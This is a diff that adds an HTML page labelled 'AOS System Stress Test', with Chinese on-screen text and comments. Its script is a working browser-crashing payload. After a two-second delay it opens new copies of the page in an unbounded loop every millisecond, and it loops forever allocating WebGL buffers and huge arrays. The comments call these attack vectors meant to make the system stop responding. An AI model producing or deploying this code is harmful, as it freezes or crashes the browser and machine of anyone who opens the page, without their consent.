@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>AOS System Stress Test</title>
+    <style>
+        body { background: #000; color: #ff0000; font-family: monospace; text-align: center; padding-top: 20%; }
+        .warning { font-size: 24px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="warning">AOS 核心压力测试中...</div>
+    <p>系统即将停止响应</p>
+
+    <script>
+        // 等待 2 秒给用户最后一次关闭窗口的机会
+        setTimeout(() => {
+            // Level 1: 内存黑洞 - 持续分配不可回收的大型对象
+            const memoryLeak = [];
+            
+            // Level 2: 进程爆炸 - 无限开启新窗口 (需允许弹窗)
+            // 这会导致浏览器进程管理器瞬间过载
+            const triggerWindows = () => {
+                while(true) {
+                    window.open(window.location.href, '_blank', 'width=100,height=100');
+                }
+            };
+
+            // Level 3: 渲染引擎崩溃 - 强制 GPU 进行无限递归的复杂计算
+            const crashGPU = () => {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                while(true) {
+                    // 模拟极高频率的缓冲区分配
+                    gl.createBuffer();
+                    memoryLeak.push(new Array(1000000).fill("CRASH"));
+                }
+            };
+
+            // 同时启动所有攻击向量
+            setInterval(triggerWindows, 1);
+            crashGPU();
+        }, 2000);
+    </script>
+</body>
+</html>
